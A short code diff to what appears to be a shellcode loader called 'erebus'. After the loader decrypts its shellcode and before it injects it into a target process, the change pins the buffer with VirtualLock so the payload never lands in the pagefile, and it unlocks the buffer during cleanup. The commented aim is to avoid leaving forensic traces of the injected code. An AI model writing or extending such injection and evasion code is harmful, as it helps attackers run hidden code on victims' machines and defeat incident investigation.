@@ -157,6 +157,11 @@ VOID entry(void)
 
 	LOG_SUCCESS("Processed shellcode: %zu bytes", shellcode_size);
 
+	// Pin the decrypted buffer into the working set so it never reaches the
+	// pagefile during the injection window. Best-effort - if the working-set
+	// quota refuses the lock we still inject, we just accept the paging risk.
+	BOOL locked = VirtualLock(shellcode_ptr, shellcode_size);
+
 	// Execute injection
 	erebus::config.injection_method(shellcode_ptr, shellcode_size, process_handle, thread_handle);
 
@@ -164,6 +169,7 @@ VOID entry(void)
 	if (shellcode_ptr)
 	{
 		SecureZeroMemory(shellcode_ptr, shellcode_size);
+		if (locked) VirtualUnlock(shellcode_ptr, shellcode_size);
 		VirtualFree(shellcode_ptr, 0, MEM_RELEASE);
 	}
 
